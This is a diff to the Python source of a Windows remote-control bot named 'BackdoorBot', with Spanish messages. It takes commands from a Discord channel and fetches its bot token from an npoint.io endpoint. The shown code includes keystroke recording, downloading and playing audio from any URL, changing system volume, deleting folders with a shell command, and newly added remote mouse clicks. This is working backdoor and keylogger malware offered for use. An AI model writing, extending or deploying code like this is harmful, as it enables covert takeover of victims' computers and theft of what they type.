@@ -1,18 +1,29 @@
+import ctypes.wintypes
 import discord
 import pyautogui, keyboard
 import io
 import subprocess, threading
-import playsound, winsound
-import os, tempfile
+import playsound, winsound, pygame.mixer
+import os
 import requests
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-from ctypes import cast, POINTER
+import ctypes
 from comtypes import CLSCTX_ALL
+import shutil
 
-temp_dir = tempfile.gettempdir()
+def get_documents_folder():
+    CSIDL_PERSONAL = 5
+    SHGFP_TYPE_CURRENT = 0
+
+    buf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
+    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_PERSONAL, None, SHGFP_TYPE_CURRENT, buf)
+    return buf.value
+
+temp_dir = os.path.join(get_documents_folder())
 recording = False
 recorded_keys = []
 recording_thread = None
+app_version = "1.0.0"
 
 def fetch_token():
     response = requests.get("https://api.npoint.io/db9d3767c9e0cb7889a4")
@@ -23,13 +34,26 @@ def fetch_token():
         raise Exception("Error al obtener el token de la API")
 
 def download_audio(url, filename):
+    os.mkdir(os.path.join(temp_dir, "daSigmaFolder"))
     
     response = requests.get(url)
-    with open(os.path.join(temp_dir, filename), 'wb') as file:
+    with open(os.path.join(temp_dir + "daSigmaFolder", filename), 'wb') as file:
         try:
             file.write(response.content)
         except Exception as e:
             return (f"Error al descargar el audio: {e}")
+
+def play_audio(filename):
+    try:
+        pygame.mixer.init()
+        pygame.mixer.music.load(os.path.join(temp_dir, "daSigmaFolder", filename))
+        pygame.mixer.music.play()
+
+        while pygame.mixer.music.get_busy():
+            pygame.time.Clock().tick(10)
+        pygame.mixer.quit()
+    except Exception as e:
+        return (f"Error al reproducir el audio: {e}")
 
 def record_keys():
     global recording, recorded_keys
@@ -155,17 +179,18 @@ class BackdoorBot(discord.Client):
             await message.channel.send(help_text)
         elif message.content.startswith("!playsound"):
             url = message.content.split(" ", 1)[1]
+            global fileExtension
             fileExtension = url.split('.')[-1]
-            filename = os.path.join(tempfile.gettempdir(), "ANASHEIGODANASHEIAUDIOANASHEI." + fileExtension)
+            filename = os.path.join(temp_dir, "daSigmaFolder", "ANASHEIGODANASHEIAUDIOANASHEI." + fileExtension)
             await message.channel.send(f"Descargando audio desde: {url}")
             download_audio(url, filename)
             await message.channel.send("Reproduciendo sonido...")
-            playsound.playsound(filename)
+            play_audio("ANASHEIGODANASHEIAUDIOANASHEI." + fileExtension)
             await message.channel.send("Sonido reproducido.")
             import time
-        elif message.content.startswith("!removeaudio"):
-            filename = os.path.join(tempfile.gettempdir(), "ANASHEIGODANASHEIAUDIOANASHEI.mp3")
-            os.remove(filename)
+            time.sleep(1)
+            folder_path = os.path.join(temp_dir, "daSigmaFolder")
+            subprocess.run(f'rmdir /s /q "{folder_path}"', shell=True)
         elif message.content.startswith('!setvolumen'):
             try:
                 volume = int(message.content.split(" ")[1])
@@ -182,6 +207,14 @@ class BackdoorBot(discord.Client):
                     await message.channel.send("El volumen debe estar entre 0 y 100.")
             except ValueError:
                 await message.channel.send("Por favor, proporciona un número válido para el volumen.")
+        elif message.content.startswith('!getversion'):
+            await message.channel.send(f"Versión de la aplicación: {app_version}")
+        elif message.content.startswith("!leftclick"):
+            pyautogui.click(button='left')
+            await message.channel.send("Clic izquierdo realizado.")
+        elif message.content.startswith("!rightclick"):
+            pyautogui.click(button='right')
+            await message.channel.send("Clic derecho realizado.")
             
 
 
